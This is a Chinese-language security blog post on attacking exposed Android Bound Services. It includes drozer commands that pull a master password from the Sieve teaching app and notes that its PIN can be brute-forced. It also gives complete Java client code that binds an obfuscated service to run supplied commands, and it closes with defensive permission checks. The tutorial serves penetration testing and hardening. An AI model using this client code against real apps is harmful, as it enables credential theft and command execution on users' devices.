<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>Android Bound Service攻击 | MS509 Team</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/7.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">Android Bound Service攻击</h1><a id="logo" href="/.">MS509 Team</a><p class="description">Mission Studio</p></div><div id="nav-menu"><a href="/." class="current"><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">Android Bound Service攻击</h1><div class="post-meta">Mar 18, 2016<span> | </span><span class="category"><a href="/categories/安卓/">安卓</a></span></div><div class="post-content"><p>作者：小荷才露尖尖角</p>
<h3 id="0x00-引子"><a href="#0x00-引子" class="headerlink" title="0x00 引子"></a><strong>0x00 引子</strong></h3><p>去年12月，[1] 讲述了针对android bound service的攻击方法，给出了从apk包中恢复AIDL文件的工具，利用AIDL便可以编写攻击Bound Service的Client。拜这篇文章所赐，笔者也在实际测试工作中发现了类似漏洞，其中的过程却有些曲折。作为白帽子，通常情况下很难直接得到或者恢复AIDL文件，这决定了Bound Service的易守难攻，因此需要更加系统地掌握Bound Sercive的测试方法，并辅以耐心和一定的运气，才能发现类似的漏洞。在[1]的基础上，本文将分享此类漏洞的经验，进一步对Bound Service攻击进行说明。<br><a id="more"></a></p>
<h3 id="0x01-Bound-Service简介"><a href="#0x01-Bound-Service简介" class="headerlink" title="0x01 Bound Service简介"></a><strong>0x01 Bound Service简介</strong></h3><p>Bound Service提供了一种基于Binder的跨进程调用(IPC)机制，在其Service类中实现OnBind方法并返回用于IPC的IBinder对象。根据官方文档[2]，实现Bound Service有以下三种方式：</p>
<ul>
<li>继承Binder类</li>
<li>使用Messenger</li>
<li>使用AIDL</li>
</ul>
<p>由于第一种方式主要在同一进程中使用，因此我们主要关注后两种情况，只要Bound Service暴露，那么便可以编写恶意app，通过Messenger和基于AIDL的Bound Service进行跨进程通信，传入污染的数据或者直接调用被攻击应用的功能，最终对安全产生非预期的影响。</p>
<h3 id="0x02-攻击Messenger"><a href="#0x02-攻击Messenger" class="headerlink" title="0x02 攻击Messenger"></a><strong>0x02 攻击Messenger</strong></h3><p>Messenger是一种轻量级的IPC方案，其底层实现也是基于AIDL的，从android.os.Messenger的两个构造函数可以看到一些Binder的痕迹。</p>
<p><pre class="lang:default decode:true">/**</pre></p>
<ul>
<li>Create a new Messenger pointing to the given Handler. Any Message</li>
<li>objects sent through this Messenger will appear in the Handler as if</li>
<li>{@link Handler#sendMessage(Message) Handler.sendMessage(Message)} had</li>
<li>been called directly.<br>*</li>
<li>@param target The Handler that will receive sent messages.<br><em>/<br>public Messenger(Handler target) {<br>  mTarget = target.getIMessenger();<br>}<br>/*</em></li>
<li>Create a Messenger from a raw IBinder, which had previously been</li>
<li>retrieved with {@link #getBinder}.<br>*</li>
<li>@param target The IBinder this Messenger should communicate with.<br>*/<br>public Messenger(IBinder target) {<br>  mTarget = IMessenger.Stub.asInterface(target);<br>}<br>使用Messenger的Service典型实现中，一定会有一个继承于Handler的内部类，用来处理客户端发送过来的消息，测试方法就是检查Handler的handleMessage方法，观察发送特定的Message后会引起被攻击应用如何反应。Drozer中用于漏洞教学的Sieve程序给出了实际案例。</li>
</ul>
<p>Sieve暴露了两个服务，这两个服务均使用Messenger进行跨进程通信</p>
<p><pre class="lang:default decode:true ">dz&gt; run app.service.info -a com.mwr.example.sieve<br>Package: com.mwr.example.sieve<br> com.mwr.example.sieve.AuthService<br>   Permission: null<br> com.mwr.example.sieve.CryptoService<br>   Permission: null</pre><br>查看AuthService的handleMessage方法</p>
<p><pre class="lang:default decode:true"> public void handleMessage(Message msg) {<br>…<br>            Bundle v8 = null;<br>            int v7 = 9234;<br>            int v6 = 7452;<br>            AuthService.this.responseHandler = msg.replyTo;<br>            Object v2 = msg.obj;<br>            switch(msg.what) {<br>                case 4: {<br>                    //Check if pin and password are set<br>                }<br>                case 2354: {<br>                    if(msg.arg1 == v6) {<br>                      //Return pin Requires password from Bundle<br>                    }<br>                    else if(msg.arg1 == v7) {<br>//Return password Requires pin from Bundle！！<br>                        v1 = 41;<br>                        if(AuthService.this.verifyPin(((Bundle)v2).getString(“com.mwr.example.sieve.PIN”))<br>                                ) {<br>                            v2_1 = new Bundle();<br>                            v2_1.putString(“com.mwr.example.sieve.PASSWORD”, AuthService.this.getKey());<br>                            v3 = 0;<br>                        }<br>…<br>                    this.sendResponseMessage(5, v1, v3, v2_1);<br>                    return;<br>                label_57:<br>                    this.sendUnrecognisedMessage();<br>                    break;<br>                }<br>                case 6345: {<br>                    if(msg.arg1 == v6) {<br>//Set Password Requires Current Password from Bundle<br>                        v1 = 42;<br>                        v3 = AuthService.this.setKey(((Bundle)v2).getString(“com.mwr.example.sieve.PASSWORD”))<br>                                 ? 0 : 1;<br>                    }<br>                    else if(msg.arg1 == v7) {<br>//Set Pin Requires Current Pin from Bundle<br>                        v1 = 41;<br>                        v3 = AuthService.this.setPin(((Bundle)v2).getString(“com.mwr.example.sieve.PIN”))<br>                                 ? 0 : 1;<br>                    }<br>                    else {<br>                        goto label_99;<br>                    }</pre></p>
<pre><code>this.sendResponseMessage(4, v1, v3, v8);
return;&lt;/pre&gt;
</code></pre><p>AuthService根据传入Message对象的不同，执行不同的动作，注意当Message对象的what为2354，arg1为9234时，如果当前的PIN正确，则可返回Sieve使用的主password。Drozer提供了app.service.send模块，利用该模块可以很方便地测试基于Messenger的跨进程通信。</p>
<p><pre class="lang:default decode:true">dz&gt; run app.service.send com.mwr.example.sieve com.mwr.example.sieve.AuthService –msg 2354 9234 0 –extra string com.mwr.example.sieve.PIN 1234 –bundle-as-obj<br>Got a reply from com.mwr.example.sieve/com.mwr.example.sieve.AuthService:<br> what: 5<br> arg1: 41<br> arg2: 0<br> Extras<br>   com.mwr.example.sieve.PASSWORD (String) : passw0rd123123123</pre><br>如果PIN不正确，则只返回当前传入的PIN</p>
<p><pre class="lang:default decode:true">dz&gt; run app.service.send com.mwr.example.sieve com.mwr.example.sieve.AuthService –msg 2354 9234 33333 –extra string com.mwr.example.sieve.PIN 2344 –bundle-as-obj<br>Got a reply from com.mwr.example.sieve/com.mwr.example.sieve.AuthService:<br>  what: 5<br>  arg1: 41<br>  arg2: 1<br>  Extras<br>    com.mwr.example.sieve.PIN (String) : 2344</pre><br>由于PIN只有4位，利用上述两种结果的不同，可以编写程序进行爆破。另外一个CryptoService同样也有类似的漏洞，通过传入特定的Message对象，执行加解密操作，可被用来解密password，详见[3]。</p>
<h3 id="0x03-攻击基于AIDL的Bound-Service"><a href="#0x03-攻击基于AIDL的Bound-Service" class="headerlink" title="0x03 攻击基于AIDL的Bound Service"></a><strong>0x03 攻击基于AIDL的Bound Service</strong></h3><p>文献[1]给出了一个存在命令执行漏洞的Bound Service，并根据Bound Service的apk生成AIDL接口文件，编写攻击程序调用Bound Service中的命令执行方法。然而，在使用中发现生成AIDL文件的工具主要根据smali文件中的Stub.Proxy类进行抓取，而当apk进行了混淆，便不能正确生成AIDL文件了。例如，我们配置build.gradle中的minifyEnabledtrue开关为true，使用Android Studio的默认混淆规则。对混淆的apk与未混淆的apk使用JEB逆向对比如下</p>
<p><img src="http://www.ms509.com/wp-content/uploads/2016/03/contract.png" alt="contract"></p>
<p>混淆后的apk少了许多有关AIDL的信息，没有了Stub Proxy这些特征，致使如下代码实现的GenerateAIDL工具出错</p>
<p><pre class="lang:default decode:true"> if (descriptorToDot(interfaces.first()).equals(IINTERFACE_CLASS)) {</pre></p>
<p> /<em> Now grab the Stub.Proxy, to get the protocols </em>/<br> String stubProxyName = className + “.Stub.Proxy”;<br> DexBackedClassDef stubProxyDef = getStubProxy(classDefs, stubProxyName);<br> if (stubProxyDef == null) {<br> System.err.println(“[ERROR] Unable to find Stub.Proxy for class: “</p>
<ul>
<li>stubProxyName + “, Skiping!”);<br>continue;<br>}<br><img src="http://www.ms509.com/wp-content/uploads/2016/03/noAIDL.png" alt="noAIDL"></li>
</ul>
<p>由于AIDL文件本质上只是SDK为我们提供的一种快速实现Binder的工具，因此完全可以不依赖AIDL文件而实现Binder的方法，这也是在实际渗透测试过程中最常见的情况。下面我们结合有漏洞混淆后的apk进行说明。</p>
<p>怀疑暴露的ITestService可传入一个可控字符串执行命令后，我们可以按如下步骤编写Client去Bind该Service进行测试。</p>
<p>首先，可声明一个AIDL性质的接口，可直接拷贝JEB中继承IInterface的a接口，该接口有一个a方法。</p>
<p><pre class="lang:default decode:true">// in fact a is TestInterface<br>public interface a extends IInterface {<br>  static final String DESCRIPTOR = “com.jakev.boundserver.aidl.TestInterface”;<br>  String a(String arg1) throws RemoteException;<br>}</pre><br>接下来，编写实现a接口的Stub极其内部类Proxy，可参考系统生成的代码，结构略作调整使之清晰化。注意，一定要在Proxy类中实现a方法，其传入远程调用的code为1，打包数据data写入a方法中的字符串类型的参数。</p>
<p><pre class="lang:default decode:true">public class Stub extends Binder implements a {<br>    /<em>* Construct the stub at attach it to the interface. </em>/<br>    public Stub() {<br>        super();<br>        this.attachInterface(this, DESCRIPTOR);<br>    }</pre></p>
<pre><code>/** Cast an IBinder object into an TestInterface(a) interface,
 * generating a proxy if needed
*/
public static a asInterface(IBinder obj) {
    if (obj == null) {
        return null;
    }
    IInterface iin = obj.queryLocalInterface(DESCRIPTOR);
    if(((iin != null) &amp;amp;&amp;amp; (iin instanceof a))) {
        return (a)iin;
    }
    return new Stub.Proxy(obj);
}
public IBinder asBinder() {
    return this;
}
public boolean onTransact(int code, Parcel data, Parcel reply, int flag) throws RemoteException{
    boolean v0 = true;
    switch(code) {
        case 1: {
            data.enforceInterface(DESCRIPTOR);
            String v1 = this.a(data.readString());
            reply.writeNoException();
            reply.writeString(v1);
            break;
        }
        case 1598968902: {
            reply.writeString(DESCRIPTOR);
            break;
        }
        default: {
            v0 = super.onTransact(code, data, reply, flag);
            break;
        }
    }
    return v0;
}
public  String a(String cmd) throws RemoteException {
    // Server do not have to implement this method, just return null
    return null;
}

private static class Proxy implements a {
    private IBinder mRemote;
    Proxy(IBinder remote) {
        mRemote = remote;
    }

    @Override
    public IBinder asBinder() {
        return mRemote;
    }
    public String getInterfaceDescriptor() {
        return DESCRIPTOR;
    }

    @Override
    public String a(String cmd) throws RemoteException{
        String result = null;
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(DESCRIPTOR);
            data.writeString(cmd);
            mRemote.transact(1, data, reply, 0);
            reply.readException();
            result = reply.readString();
        }
        finally {
            reply.recycle();
            data.recycle();
        }

        return result;
    }
}
</code></pre><p>}<br>&nbsp;</p>
<p>最后，编写攻击app的Activity，在其中bind有漏洞的Service</p>
<p><pre class="lang:default decode:true">mServiceConnection = new myServiceConnection();<br>Intent i = new Intent();<br>i.setClassName(“com.jakev.boundserver”, “com.jakev.boundserver.ITestService”);<br>boolean ret = bindService(i, mServiceConnection, BIND_AUTO_CREATE);</pre><br>在ServiceConnection的回调函数中调用a方法</p>
<p><pre class="lang:default decode:true ">public void onServiceConnected(ComponentName name, IBinder service) {<br>    Log.d(TAG, “OnServiceConnected “);<br>    String command = editCommand.getText().toString();</pre></p>
<pre><code>try {
    a mTestService = Stub.asInterface(service);
    String result = mTestService.a(command);
    Log.d(TAG, &quot;exec result is:&quot; + result);
    txtResult.setText(result);
} catch (RemoteException e) {
    e.printStackTrace();
}
</code></pre><p>}<br>&nbsp;</p>
<p>攻击效果如下</p>
<p><img src="http://www.ms509.com/wp-content/uploads/2016/03/attackresult.png" alt="attackresult"></p>
<p>至此，就完成了不依赖于AIDL文件攻击Bound Service的过程。</p>
<h3 id="0x04-攻击已注册的系统服务"><a href="#0x04-攻击已注册的系统服务" class="headerlink" title="0x04 攻击已注册的系统服务"></a><strong>0x04 攻击已注册的系统服务</strong></h3><p>通过adb shell service list可以查看在context manager（或servicemanager）中注册的系统服务名称和IBinder接口。</p>
<p><img src="http://www.ms509.com/wp-content/uploads/2016/03/systemservice.png" alt="systemservice"></p>
<p>这些服务也暴露了潜在的攻击面，可以编写客户端程序通过服务名获得Binder对象的引用，进而调用服务的功能或者传入污染的数据。</p>
<p><pre class="lang:default decode:true">sp sm = defaultServiceManager();<br>sp binder = sm-&gt;getService(String16(“demo”)); //demo is Service Name<br>sp ServiceName = interface_cast(binder);</pre><br>构造Parcel对象data后，则可以通过binder-&gt;transact(int code, Parcel data, Parcel reply, int flag)调用系统服务。或者在具有服务实现源代码的情况下，直接通过ServcieName-&gt;ServiceMethod()调用系统服务实现的方法，具体可参考[4]。</p>
<p>一般情况下，系统服务都有严格的权限检查机制，漏洞更是罕见，但也有案例。如，<a href="http://www.wooyun.org/bugs/wooyun-2010-081867" target="_blank" rel="external">三星手机随意访问RILD接口（可以解除定制机网络制式的软限制）</a>，作者在POC中给两种访问ITelephony服务sendOemRilRequestRaw接口的方法（Java和C）。</p>
<h3 id="0x05-防御"><a href="#0x05-防御" class="headerlink" title="0x05 防御"></a><strong>0x05 防御</strong></h3><p>除了在Manifest文件中对暴露的Service增加Signature的保护级别外，Binder还提供了更为灵活的验证方式</p>
<ul>
<li>使用Binder的静态方法getCallingPid或者getCallingUid来验证IPC调用者的身份，在获得调用者uid以后，可进一步使用PackageManager.getPackagesForUid(int uid)来获得调用者的包名，然后使用PackageManager.getPackageInfo(String Packagename, int flag)检查是否具有相应的权限（使用PackageManager.GET_PERMISSIONS flag）</li>
<li>在Service的OnBind方法中调用Context.checkCallingPermission(String permission)或者checkCallingPermissionOrSelf (String permission) 方法，验证IPC调用者是否拥有指定的权限，同样适用于Messenger；</li>
<li>使用Context.enforceCallingPermission(String permission, String message)，如果调用者不具备权限，自动抛出SecurityException。</li>
</ul>
<h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p>[1] <a href="http://blog.thecobraden.com/2015/12/attacking-bound-services-on-android.html?m=1" target="_blank" rel="external">http://blog.thecobraden.com/2015/12/attacking-bound-services-on-android.html?m=1</a></p>
<p>[2] <a href="http://developer.android.com/guide/components/bound-services.html" target="_blank" rel="external">http://developer.android.com/guide/components/bound-services.html</a></p>
<p>[3] The Mobile Application Hackers Handbook</p>
<p>[4] <a href="http://ebixio.com/blog/2012/07/07/using-android-ipc-binders-from-native-code/" target="_blank" rel="external">http://ebixio.com/blog/2012/07/07/using-android-ipc-binders-from-native-code/</a></p>
</div><div class="tags"></div><div class="post-nav"><a href="/2016/03/19/e8-b7-a8-e5-b9-b3-e5-8f-b0-e7-89-88-e4-b8-ad-e5-9b-bd-e8-8f-9c-e5-88-80cknife-e5-8f-91-e5-b8-83/" class="pre">跨平台版中国菜刀Cknife(C刀)更新开源</a><a href="/2016/03/09/drozer-e6-a8-a1-e5-9d-97-e7-9a-84-e7-bc-96-e5-86-99-e5-8f-8a-e6-a8-a1-e5-9d-97-e5-8a-a8-e6-80-81-e5-8a-a0-e8-bd-bd-e9-97-ae-e9-a2-98-e7-a0-94-e7-a9-b6/" class="next">drozer模块编写实战</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank" class="search-form"><input type="text" name="q" maxlength="20" placeholder="Search"/><input type="hidden" name="sitesearch" value="http://yoursite.com"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/IOS/">IOS</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB/">WEB</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/WEB/安全工具/">安全工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB/渗透测试/">渗透测试</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/二进制/">二进制</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/二进制/原创漏洞/">原创漏洞</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/二进制/安卓/">安卓</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/原创漏洞/">原创漏洞</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/原创漏洞/安卓/">安卓</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全工具/">安全工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/安卓/">安卓</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/未分类/">未分类</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/移动安全/">移动安全</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/android/" style="font-size: 15px;">android</a> <a href="/tags/android-drozer/" style="font-size: 15px;">android drozer</a> <a href="/tags/Cknife-Disclaimer/" style="font-size: 15px;">Cknife Disclaimer</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/08/04/github-e4-bf-a1-e6-81-af-e6-b3-84-e9-9c-b2-e5-8d-87-e7-ba-a7-e7-89-88-e6-a1-88-e4-be-8b/">Github信息泄露升级版案例</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/07/14/684/">CVE-2016-10277在MOTO X手机上的漏洞利用实践</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/27/e8-93-9d-e7-89-99app-e6-bc-8f-e6-b4-9e-e7-b3-bb-e5-88-97-e5-88-86-e6-9e-90-e4-b9-8b-e4-ba-8ccve-2017-0639/">蓝牙App漏洞系列分析之二</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/23/Bluetooth-Vul-3/">蓝牙App漏洞系列分析之三</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/14/e5-90-8c-e5-bd-a2-e5-bc-82-e4-b9-89-e5-ad-97-e9-92-93-e9-b1-bc-e6-94-bb-e5-87-bb-ef-bc-8c-e9-92-89-e9-92-89-e4-b8-ad-e6-8b-9b/">“同形异义字”钓鱼攻击，钉钉中招</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/12/Bluetooth-Vul-2/">蓝牙App漏洞系列分析之二</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/06/e5-88-86-e4-ba-ab-e4-b8-80-e7-a7-8d-e5-8f-af-e5-85-b3-e9-97-ad-e5-a4-a7-e5-a4-9a-e6-95-b0-e6-9d-80-e8-bd-af-e7-9a-84-e6-8a-80-e6-9c-af-ef-bc-88-e5-af-b9360-e5-ae-89-e5-85-a8-e5-8d-ab-e5-a3-ab/">分享一种可关闭大多数杀软的技术（对360安全卫士已验证成功）</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/15/e8-93-9d-e7-89-99app-e6-bc-8f-e6-b4-9e-e7-b3-bb-e5-88-97-e5-88-86-e6-9e-90-e4-b9-8b-e4-b8-80/">蓝牙App漏洞系列分析之一</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/14/e9-a6-96-e5-8f-91-wannacry-e5-8b-92-e7-b4-a2-e8-bd-af-e4-bb-b6-e6-af-8d-e4-bd-93-e4-b8-bb-e7-a8-8b-e5-ba-8f-e9-80-86-e5-90-91-e5-88-86-e6-9e-90-ef-bc-88-e5-90-ab-e4-b8-b4-e6-97-b6-e8-a7-a3-e5-86-b3/">首发 | Wannacry勒索软件母体主程序逆向分析（含临时解决方案自动化工具</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/04/Bluetoooth_Vul_1/">蓝牙App漏洞系列分析之一</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2017 <a href="/." rel="nofollow">MS509 Team.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a id="rocket" href="#top" class="show"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.1.20/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.1.20/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>